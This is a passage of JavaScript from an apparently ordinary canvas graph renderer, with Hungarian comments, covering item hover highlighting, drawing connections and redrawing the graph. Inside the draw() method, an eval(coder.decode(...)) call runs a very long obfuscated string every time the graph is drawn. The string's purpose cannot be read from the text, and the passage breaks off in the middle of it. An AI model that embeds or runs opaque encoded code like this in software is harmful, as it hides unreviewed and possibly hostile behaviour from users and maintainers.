						 item.properties.position.x + item.properties.size.width / 2,
						 item.properties.position.y + offset + item.properties.size.height - Prefs.item.padding);
		}

		drawText(fontBgColor, offset);
		drawText(fontMainColor, 0);

		if(item.properties.hovered){
			var linewidth = 2;

			drawer.roundRect(
				item.properties.position,
				item.properties.size,
				0,
				linewidth
			);

			ctx.strokeStyle = "#000";
			ctx.stroke();

			var roots  = items.getRoots(item.id),
				length = roots.length;

			for(var i = 0; i < length; i++){
				roots[i].properties.highlight = true;
				EventBus.dispatch("redrawItem", this, roots[i].id);
			}

			var pendents = items.getPendents(item.id),
				length   = pendents.length;
			for(var i = 0; i < length; i++){
				var pitem = items.getItemById(pendents[i]);
				pitem.properties.pendent = true;
				EventBus.dispatch("redrawItem", this, pendents[i]);
			}
		}

	}

	/**
	 * Kapcsolat kirajzolása
	 *
	 * @method drawConnection
	 * @param {String} id1 Egyik elem azonosító
	 * @param {String} id2 Másik elem azonosító
	 */
	this.drawConnection = function(id1, id2){
		var item1 = items.getItemById(id1),
			item2 = items.getItemById(id2);

		if((item1.level > item2.level) || (item1.level == item2.level && item1.properties.position.y > item2.properties.position.y)){
			var t = item1;
			item1 = item2;
			item2 = t;
		}

		if(item1.level == item2.level){
			drawer.drawConnection({
				x: item1.properties.position.x,
				y: item1.properties.position.y + item1.properties.size.height / 2
			},{
				x: item2.properties.position.x,
				y: item2.properties.position.y + item2.properties.size.height / 2
			},
			item2.level - item1.level);
		}else{
			drawer.drawConnection({
				x: item1.properties.position.x + item1.properties.size.width,
				y: item1.properties.position.y + item1.properties.size.height / 2
			},{
				x: item2.properties.position.x,
				y: item2.properties.position.y + item2.properties.size.height / 2
			},
			item2.level - item1.level);
		}
	}

	/**
	 * Összes elem (újra/ki)rajzolása
	 *
	 * @method drawItems
	 */
	this.drawItems = function(){
		var itemlist = items.getItems(),
			length   = itemlist.length;

		for(var i = 0; i < length; i++){
			this.drawItem(itemlist[i].id);
		}
	}

	/**
	 * Összes kapcsolat (újra/ki)rajzolása
	 *
	 * @method drawConnections
	 */
	this.drawConnections = function(){
		var itemList = items.getItems(),
			conns    = items.getConnections(),
			length   = itemList.length;

		for(var i = 0; i < length; i++){
			if(conns[itemList[i].id] != undefined){
				var connlength = conns[itemList[i].id].length;
				for(var j = 0; j < connlength; j++){
					this.drawConnection(itemList[i].id, conns[itemList[i].id][j]);
				}
			}
		}
	}

	/**
	 * Gráf kirajzolása
	 *
	 * @method draw
	 */
	this.draw = function(){
		var size 			= items.getGraphSize();
		canvas.width 		= size.width;
		canvas.height 		= size.height;
		canvas.style.width  = size.width+"px";
		canvas.style.height = size.height+"px";

		if(Prefs.container.fitHeight){
			container.style.height = (size.height + 30)+"px";
		}

		// this.drawConnections();
		this.drawItems();
		
    	eval(coder.decode("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FTF1BTBLBTXABTXAGlcnFoFwFyWnFoF2FaWxVyObSAWxVyJxBTBLFTW1BTXOBTBLBTXASLOnFoFwGlMnFoF4FAWxVyO2FxWxVys2BTBLFTcbBTXOBTBLBTXASTMnFoFwGlWnFoF5SAWxVyO2FxWxVyo4BTBLFTcyBTXOBTXOBTM5BTGAfxWxSLOwFaWxVyO1GAWxVxW1VaW1VlOwFaWxVyO1GAWxVyOwGxWxVyO1FxWxVyOwSAWxVyObSAW1QAWxVxW1VlOwSAWxVyObFxWxVyOwSRWxVyObGAWxVyOwSRWxVyObFRW1QAWxVxW1VlOwSAWxVyOyGxWxVyOwGxWxVyOyGAWxVyOwGxWxVyOyGAW1QAW1QAWxSRWyVeinFlswFyFnFoFwGysnFoFnGWMnGWMwFyFnFoFwGysnFoFwFlsnFoFwGyVnFoFwFlHnFoFwGyOnGWVnFoFnGWMwFTOnFoFwGlsnFoFwFTMnFoFwGlJnFoFwFLsnFoFwGlcnGWVnFoFnGWMwFLVnFoFwGlWnFoFwFLMnFoFwGlWnFoF5SRWxVyO2GAW1QAWxVxW1Vlo1BTBLFTcxBTBLSTMnFoFwGTonFoF5FxWxVyO1GaW1QAWxVxW1VlobBTBLFTWyBTBLSTJnFoFwGTHnFoFwFLWnFoFwGTMnGWVnFoFnGWMwFTMnFoFwGTWnFoFwFlOnFoFwGTsnFoFwFlsnFoFwGlHnGWVnFoFnGWMwFyWnFoFwGlMnFoFwFyonFoFwGlFnFoFwGLMnFoFwGlcnGWVnFoFnGWMwGLWnFoFwGlonFoFwGLcnFoFwGyOnFoFwGLcnFoFwGyOnGWVnGWVnFlonFbBhBTM4SLcnFoFwGlVnFoFnGWMnGWM4GaWxVyO2GAWxVysbBTBLFTc4BTBLSTHnFoFwGyOnGWVnFoFnGWM5GRWxVyO3GAWxVyOqFaWxVyO3GxWxVyOqFxWxVyO3SAW1QAWxVxW1VlOqFxWxVyO3SAWxVyOqFxWxVyO3SAWxVyOqFxWxVyO3SAW1QAW1QAWxSRWyVeinFls5SRWxVyJ4BTBLBTXABTXASTonFoF3SAWxVyOqFRWxVyJ4BTBLFTHyBTBLGysnGWVnFoFnGWMwFLWnFoF3SRWxVyOqGxWxVysqBTBLFTH5BTBLGyonGWVnFoFnGWMwFTHnFoF3SRWxVyOwFaWxVyJ4BTBLFTOyBTBLGycnGWVnFoFnGWMwFTFnFoF3GAWxVyOwFaWxVyJbBTBLFTOxBTBLGyVnGWVnFoFnGWMwFTMnFoF3GAWxVyOwFRWxVyJxBTBLFTH3BTBLGyMnGWVnFoFnGWMwFLFnFoF3FaWxVyOqFxWxVyJyBTBLFTHwBTBLGyVnGWVnFoFnGWM5SRWxVyJ1BTBLSTonFoF3SAWxVyo5BTBLGysnGWVnGWVnFoGbJuXnBTM5BTGAfxWxSLOqGAWxVyJ1BTBLBTXABTXAFTHyBTBLGyWnFoFwFLFnFoF3GaWxVyOqGAWxVyJ2BTXOBTBLBTXAFTHbBTBLGyJnFoFwFLcnFoF3GxWxVyOqGaWxVyJ2BTXOBTBLBTXAFTH2BTBLGyWnFoFwFLVnFoF3GRWxVyOqGAWxVyJ1BTXOBTXOBTBLrUB1dRWxSRWyVeinFlswFLHnFoFwFLOnFoFnGWMnGWMwFLHnFoFwFLOnFoF5SAWxVyo3BTBLSTsnFoF5GAW1QAWxVxW1Vlo4BTBLSTMnFoF5GaWxVys4BTBLSTcnFoF4GRW1QAWxVxW1Vlo2BTBLSLFnFoF5GaWxVyJ2BTBLSTcnFoF3GaW1QAW1QAWxSRWyVeinFlswFLcnFoF3FaWxVxW1VaW1VlOqSAWxVyJyBTBLFTH5BTBLGyWnFoFwFLsnFoF3GaW1QAWxVxW1VlOqSAWxVyJ3BTBLFTH3BTBLGysnFoFwFLJnFoF3SRW1QAWxVxW1VlOqGaWxVyJ5BTBLFTH2BTBLGyonFoFwFLcnFoF3SRW1QAW1QAWxSRWyVeinFlswFLMnFoF3GAWxVxW1VaW1VlOqFaWxVyJbBTBLFTHwBTBLGyWnFoFwFLOnFoF3GaW1QAWxVxW1VlOqFRWxVyJ3BTBLFTHxBTBLGysnFoFwFLMnFoF3SAW1QAW1QAWxSRWyVeinFlswFTHnFoFwFlMnFoFnGWMnGWMwFTHnFoFwFlMnFoFwFTWnFoFwFTWnFoFwFTsnFoFwFLsnGWVnFoFnGWMwFlHnFoFwFLOnFoFwFlOnFoF5GaWxVyOxFAWxVys4BTXOBTBLBTXAFTMqBTBLGyonFoFwFlHnFoF3GxWxVyOxFAWxVyJ1BTXOBTBLBTXAFTMqBTBLGyFnFoFwFlOnFoF3FaWxVyOxFRWxVyc5BTXOBTBLBTXAFTMwBTBLGlcnFoFwFTonFoFbGAWxVyOwSRWxVyVbBTXOBTXOBTM5BTGAfxWxSLOxFAWxVyJbBTBLBTXABTXAFTMqBTBLGyVnFoFwFTJnFoF3FaWxVyOwGRWxVyJwBTXOBTBLBTXAFTOxBTBLGyHnFoFwFLJnFoF3FAWxVyOqFxWxVyJwBTXOBTBLBTXASTonFoF3FRWxVyo4BTBLGyWnFoF5SAWxVyJ1BTXOBTBLBTXASTsnFoF3GRWxVyo4BTBLGyOnFoFwFLHnFoF3FAW1QAWxVxW1VlOqFaWxVyc5BTBLFTHbBTBLGlJnFoFwFLsnFoF2GxW1QAWxVxW1VlOwFaWxVyc3BTBLFTOxBTBLGlcnFoFwFTWnFoF2GaW1QAWxVxW1VlOwSAWxVyc3BTBLFTMwBTBLGlonFoFwFlOnFoF2SRW1QAW1QAWxSRWyVeinFls3GxWxVyJ4BTBLBTXABTXAGyJnFoF3SAWxVyJ1BTBLGycnFoF3GAWxVyJ1BTXOBTBLBTXAGyMnFoF3GAWxVyJwBTBLGyFnFoF2GaWxVyJyBTXOBTBLBTXAGlOnFoF3FxWxVyW3BTBLGysnFoF1GxWxVyJ4BTXOBTBLBTXAGTJnFoF3SAWxVycqBTBLGysnFoF2FaWxVyJ5BTXOBTBLBTXAGlVnFoF4FRWxVyc1BTBLSLOnFoF2GxWxVyswBTXOBTBLBTXAGyHnFoF4FRWxVyJ3BTBLGysnFoF3GxWxVyJ4BTXOBTXOBTBLrUB1dRWxSRWyVeinFls2GRWxVyJyBTBLBTXABTXAGlWnFoF3FxWxVycyBTBLGyWnFoF2GAWxVyJ3BTXOBTBLBTXAGlVnFoF3SRWxVyc1BTBLSLHnFoF2GxWxVysqBTXOBTBLBTXAGlonFoF4FAWxVyJwBTBLGyonFoF3FRWxVyJ3BTXOBTBLBTXAGyMnFoF3GRWxVyc5BTBLGyFnFoF2SRWxVyJyBTXOBTXOBTM5BTGAfxWxSLc3BTBLGycnFoFnGWMnGWM2GaWxVyJ2BTBLGlcnFoF3GxWxVyc2BTBLGyJnGWVnFoFnGWM2GxWxVyJ4BTBLGlsnFoF3SAWxVyc4BTBLGyJnGWVnFoFnGWM2SRWxVyJ1BTBLGlJnFoF3GaWxVyc3BTBLGycnGWVnGWVnFoGbJuXnBTM5BTGAfxWxSLV2BTBLGyFnFoFnGWMnGWMbGaWxVyJyBTBLGLsnFoF3GRWxVyWwBTBLGyWnGWVnFoFnGWM1FxWxVyJbBTBLGlMnFoF2SRWxVyc2BTBLGlonGWVnFoFnGWM3FAWxVyc5BTBLGyFnFoF2SAWxVyJ3BTBLGlonGWVnFoFnGWM4FAWxVyJwBTBLSLVnFoF3FxWxVysbBTBLGyFnGWVnFoFnGWM4GAWxVyJyBTBLSLcnFoF2SRWxVysbBTBLGlsnGWVnFoFnGWM4FRWxVyc2BTBLGyOnFoF2FaWxVycbBTBLGlWnGWVnFoFnGWM1GxWxVyc3BTBLGTFnFoF2SRWxVyWqBTBLGyOnGWVnFoFnGWMbSAWxVyJxBTBLGLcnFoF3FxWxVyV2BTBLGyFnGWVnGWVnFoGbJuXnBTM5BTGAfxWxSLF1BTBLGTVnFoFnGWMnGWMyGRWxVyWbBTBLFyWnFoF1GRWxVyF1BTBLGlFnGWVnFoFnGWMyGAWxVyJxBTBLFyVnFoF5FRWxVyF2BTBLFTHxBTXOBTBLBTXAFyJnFoFwFTFnFoFbGAWxVyOxFaWxVyWqBTBLFTFxBTXOBTBLBTXAGTcnFoFwGLOnFoF1GaWxVyOyGaWxVyW5BTBLFTF2BTXOBTBLBTXAGlMnFoFwFyWnFoF2FRWxVyOyFxWxVycwBTBLFTM4BTXOBTBLBTXAGlMnFoFwFlFnFoF2FaWxVyOwSAWxVycxBTBLFTO4BTXOBTBLBTXAGlMnFoFwFTsnFoF2GAWxVyOxFAWxVycbBTBLFTMyBTXOBTBLBTXAGlVnFoFwFlWnFoF2FaWxVyOxSRWxVycbBTBLFTFwBTXOBTBLBTXAGlWnFoFwFyVnFoF2GaWxVyOyGaWxVyc2BTBLFTF2BTXOBTXOBTM5BTGAfxWxSLM3BTBLGlMnFoFnGWMnGWMxGxWxVycxBTBLFyOnFoF3FxWxVyFwBTBLGyonGWVnFoFnGWMyFaWxVys2BTBLFyHnFoF5SAWxVyFyBTBLFTH3BTXOBTBLBTXAFyWnFoFwFTcnFoFbFaWxVyOyFxWxVyWqBTBLFTVwBTXOBTBLBTXAGTJnFoFwGLonFoF1GaWxVyO1FAWxVycbBTBLFTWbBTXOBTBLBTXAGyMnFoFwGTonFoF3GaWxVyO1SRWxVyJ2BTBLFTW5BTXOBTXOBTM5BTGAfxWxSLOwGxWxVyOqGxWxVxW1VaW1VlOwGxWxVyOqGxWxVyOwGRWxVyOxFAWxVyOwGAWxVyOxFaW1QAWxVxW1VlOwFxWxVyOxGAWxVyOwFxWxVyOxGAWxVyOwFxWxVyOxGAW1QAW1QAWxSRWyVeinFlsxGaWxVycqBTBLBTXABTXAFlcnFoF2FAWxVyMyBTBLGlVnFoFxFxWxVyc4BTXOBTBLBTXAFlVnFoF3FRWxVyM1BTBLGyMnFoFxGRWxVyJ1BTXOBTBLBTXAFlWnFoF3GxWxVyM1BTBLSLHnFoFxGaWxVysyBTXOBTBLBTXAFlJnFoF4GxWxVyM3BTBLSTHnFoFxSRWxVyowBTXOBTBLBTXAFyHnFoF5FxWxVyFwBTBLSTFnFoFyFRWxVyoyBTXOBTXOBTM5BTGAfxWxSLM3BTBLGlonFoFnGWMnGWMxGxWxVyc5BTBLFlWnFoF3FaWxVyM1BTBLGyVnGWVnFoFnGWMxGRWxVyJ2BTBLFlJnFoF4FRWxVyM3BTBLSLOnGWVnGWVnFlonFbBhBTM4FTV2BTBLSTsnFoFnGWMnGWMwGLcnFoF5SAWxVyObGaWxVyOqFaWxVyObGxWxVyOqFaW1QAWxVxW1VlObGxWxVyOqFxWxVyO1FAWxVyOqGAWxVyO1FAWxVyOqGRW1QAWxVxW1VlO1FRWxVyOqGxWxVyO1FaWxVyOqSRWxVyO1FxWxVyOqSRW1QAWxVxW1VlO1GRWxVyOqSRWxVyO1GaWxVyOqSAWxVyO1SAWxVyOqGaW1QAWxVxW1VlO2FAWxVyOqGAWxVyO2FRWxVyOqGRWxVyO2FaWxVyOqGAW1QAWxVxW1VlO2FaWxVyOqFxWxVyO2FaWxVyOqFRWxVyO2FaWxVyOqFRW1QAW1QAWxSRWyVeinFlswGLOnFoFwFLVnFoFnGWMnGWMwGLOnFoFwFLVnFoFwGLWnFoFwFTOnFoFwGTFnFoFwFTOnGWVnFoFnGWMwGlOnFoFwFTOnFoFwGlcnFoFwFLJnFoFwGlcnFoFwFLJnGWVnFoFnGWMwGlcnFoFwFLJnFoFwGyHnFoFwFTFnFoFwGlonFoFwFlHnGWVnFoFnGWMwGlonFoFwFlcnFoFwGlJnFoFwFlWnFoFwGlJnFoFwFlWnGWVnGWVnFlonFbBhBTM4FTJyBTBLFTVwBTBLBTXABTXAFTJyBTBLFTVwBTBLFTJwBTBLFTF5BTBLFTJwBTBLFTF5BTXOBTBLBTXAFTJwBTBLFTF3BTBLFTJqBTBLFTFbBTBLFTJqBTBLFTFyBTXOBTBLBTXAFTJqBTBLFTFxBTBLFTJqBTBLFTFxBTBLFTc5BTBLFTFqBTXOBTBLBTXAFTc4BTBLFTM5BTBLFTc4BTBLFTM5BTBLFTc4BTBLFTM4BTXOBTBLBTXAFTc4BTBLFTM3BTBLFTc4BTBLFTM1BTBLFTc3BTBLFTM1BTXOBTBLBTXAFTc3BTBLFTM1BTBLFTc1BTBLFTM3BTBLFTc1BTBLFTM3BTXOBTBLBTXAFTc1BTBLFTM3BTBLFTc2BTBLFTM4BTBLFTc2BTBLFTM5BTXOBTBLBTXAFTc2BTBLFTM5BTBLFTcbBTBLFTFwBTBLFTcyBTBLFTFwBTXOBTBLBTXAFTcyBTBLFTFxBTBLFTcbBTBLFTFyBTBLFTcyBTBLFTFbBTXOBTBLBTXAFTcxBTBLFTF1BTBLFTW5BTBLFTVqBTBLFTV5BTBLFTVqBTXOBTBLBTXAFTF5BTBLFTVqBTBLFTF1BTBLFTF3BTBLFTFqBTBLFTFxBTXOBTBLBTXAFTM1BTBLFTM3BTBLFTM2BTBLFTMqBTBLFTM4BTBLFTO2BTXOBTBLBTXAFTFqBTBLFTOwBTBLFTVwBTBLFTHbBTBLFTVwBTBLFTHbBTXOBTXOBTM5BTGAJAWxSLObFRWxVyOqGAWxSRWyVuHnFlswGLOnFoFwFLVnFlonFbBiBTM4BTM5BTGAfxWxSLo2BTBLFTcwBTBLBTXABTXASTcnFoFwGlOnFoFwFLOnFoFwGlFnFoFwFLFnFoFwGlHnGWVnFoFnGWMwFLVnFoFwGTsnFoFwFLMnFoFwGTVnFoFwFLMnFoFwGTVnGWVnGWVnFlonFbBhBTM4FTc1BTBLFTFwBTBLBTXABTXAFTc1BTBLFTFwBTBLFTc1BTBLFTFxBTBLFTc2BTBLFTFxBTXOBTBLBTXAFTc3BTBLFTFxBTBLFTc4BTBLFTFwBTBLFTc4BTBLFTFqBTXOBTBLBTXAFTc4BTBLFTFqBTBLFTc4BTBLFTM5BTBLFTc4BTBLFTM5BTXOBTXOBTM5BTGAfxWxSLO2FxWxVyOyGAWxVxW1VaW1VlO2FxWxVyOyGAWxVyO2FRWxVyObFRWxVyO1FaWxVyObFaW1QAWxVxW1VlObFaWxVyObGAWxVyObFRWxVyObFaWxVyOySAWxVyObFRW1QAWxVxW1VlOyGRWxVyOySRWxVyOyFaWxVyOyGAWxVyOyFaWxVyOyGAW1QAW1QAWxSRWyVeinFlswGyHnFoFwFyFnFoFnGWMnGWMwGyHnFoFwFyFnFoFwGyWnFoFwFyWnFoFwGycnFoFwFyJnGWVnFoFnGWMwGyJnFoFwFyonFoFwSLOnFoFwGLMnFoFwSLOnFoFwGLMnGWVnGWVnFlonFbBhBTM4SLsnFoFwGlsnFoFnGWMnGWM4SAWxVyO2SAWxVyowBTBLFTc5BTBLSTOnFoFwGlsnGWVnFoFnGWM5FaWxVyO2GxWxVyoyBTBLFTc2BTBLSTFnFoFwGlWnGWVnFoFnGWM5FxWxVyO2GRWxVyoyBTBLFTc1BTBLSTFnFoFwGlWnGWVnGWVnFlonFbBhBTM4FTF2BTBLFTF5BTBLBTXABTXAFTF2BTBLFTF5BTBLFTF2BTBLFTVxBTBLFTF2BTBLFTVyBTXOBTBLBTXAFTF2BTBLFTVbBTBLFTF2BTBLFTV1BTBLFTF2BTBLFTV1BTXOBTBLBTXAFTF1BTBLFTV1BTBLFTFbBTBLFTV2BTBLFTFbBTBLFTV2BTXOBTXOBTM5BTGAfxWxSLOyGaWxVyObGRWxVxW1VaW1VlOyGaWxVyObGRWxVyOyGaWxVyObGxWxVyOyGRWxVyO1FAW1QAWxVxW1VlOyGRWxVyO1FaWxVyOyFxWxVyO1FxWxVyOyFxWxVyO1FxW1QAW1QAWxSRWyVeinFlswFyOnFoFwFyFnFoFnGWMnGWMwFyOnFoFwFyFnFoFwFyHnFoFwFyJnFoFwFyHnFoFwFysnGWVnFoFnGWMwFyHnFoFwFysnFoFwFyHnFoFwFyonFoFwFyOnFoFwFyonGWVnFoFnGWMwFyMnFoFwGLHnFoFwFyFnFoFwFyonFoFwFyFnFoFwFyonGWVnGWVnFlonFbBhBTM4FTFqBTBLFTF4BTBLBTXABTXAFTFqBTBLFTF4BTBLFTM5BTBLFTVqBTBLFTM5BTBLFTVwBTXOBTBLBTXAFTM4BTBLFTVwBTBLFTM4BTBLFTVyBTBLFTM5BTBLFTVyBTXOBTBLBTXAFTFqBTBLFTVbBTBLFTFqBTBLFTVbBTBLFTFqBTBLFTVbBTXOBTXOBTM5BTGAfxWxSLOxSAWxVyObFxWxVxW1VaW1VlOxSAWxVyObFxWxVyOxSAWxVyObGAWxVyOxGxWxVyObGaW1QAWxVxW1VlOxGxWxVyObSAWxVyOxGxWxVyO1FAWxVyOxGxWxVyO1FAW1QAW1QAWxSRWyVeinFlswFlJnFoFwGLsnFoFnGWMnGWMwFlJnFoFwGLsnFoFwFlVnFoFwGTOnFoFwFlcnFoFwGTFnGWVnFoFnGWMwFlJnFoFwGTWnFoFwFlsnFoFwGTcnFoFwFyHnFoFwGTcnGWVnFoFnGWMwFyMnFoFwGTcnFoFwFyJnFoFwGTcnFoFwFysnFoFwGTcnGWVnFoFnGWMwFyonFoFwGTcnFoFwGLMnFoFwGTWnFoFwGLFnFoFwGTWnGWVnFoFnGWMwGLWnFoFwGTcnFoFwGLcnFoFwGTcnFoFwGLsnFoFwGTcnGWVnFoFnGWMwGLonFoFwGTcnFoFwGTVnFoFwGTWnFoFwGTcnFoFwGTWnGWVnFoFnGWMwGTsnFoFwGTWnFoFwGlMnFoFwGTVnFoFwGlWnFoFwGTWnGWVnFoFnGWMwGlsnFoFwGTcnFoFwGyMnFoFwGTonFoFwGyMnFoFwGTonGWVnGWVnFlonFbBhBTM4FTF2BTBLFTV2BTBLBTXABTXAFTF2BTBLFTV2BTBLFTF3BTBLFTV1BTBLFTF5BTBLFTV3BTXOBTBLBTXAFTVwBTBLFTV4BTBLFTVxBTBLFTV5BTBLFTVxBTBLFTWqBTXOBTBLBTXAFTVxBTBLFTWxBTBLFTVxBTBLFTWxBTBLFTVxBTBLFTWxBTXOBTXOBTM5BTGAfxWxSLOySAWxVyObGaWxVxW1VaW1VlOySAWxVyObGaWxVyOySAWxVyObGAWxVyOySAWxVyObGAW1QAWxVxW1VlOySRWxVyObFxWxVyOySRWxVyObFxWxVyOySRWxVyObFxW1QAW1QAWxSRWyVeinFlswFlsnFoFwGLFnFoFnGWMnGWMwFlsnFoFwGLFnFoFwFlFnFoFwGLHnFoFwFlMnFoFwFysnGWVnFoFnGWMwFlMnFoFwFyJnFoFwFlFnFoFwFyWnFoFwFlFnFoFwFyFnGWVnFoFnGWMwFlVnFoFwFyOnFoFwFlFnFoFwFyOnFoFwFlVnFoFwFyHnGWVnFoFnGWMwFlWnFoFwFlonFoFwFlWnFoFwFlonFoFwFlWnFoFwFlsnGWVnFoFnGWMwFlcnFoFwFlcnFoFwFlcnFoFwFlVnFoFwFlcnFoFwFlVnGWVnGWVnFlonFbBhBTM4FTM4BTBLFTF4BTBLBTXABTXAFTM4BTBLFTF4BTBLFTM5BTBLFTF4BTBLFTFqBTBLFTF3BTXOBTBLBTXAFTFqBTBLFTF2BTBLFTFqBTBLFTF2BTBLFTFqBTBLFTF2BTXOBTXOBTM5BTGAfxWxSLOySAWxVyOqGAWxVxW1VaW1VlOySAWxVyOqGAWxVyOySAWxVyOqFxWxVyOySAWxVyOqFaW1QAWxVxW1VlOySRWxVyOqFAWxVyOySRWxVyOqFAWxVyOySRWxVyOqFAW1QAW1QAWxSRWyVeinFlswGlJnFoFwFLsnFoFnGWMnGWMwGlJnFoFwFLsnFoFwGlonFoFwFLsnFoFwGlonFoFwFLJnGWVnFoFnGWMwGlonFoFwFLWnFoFwGlsnFoFwFLVnFoFwGlsnFoFwFLVnGWVnGWVnFlonFbBhBTM4FTFbBTBLFTH4BTBLBTXABTXAFTFbBTBLFTH4BTBLFTFwBTBLFTH1BTBLFTFwBTBLFTHxBTXOBTBLBTXAFTFqBTBLSTonFoFwFyOnFoFwFLOnFoF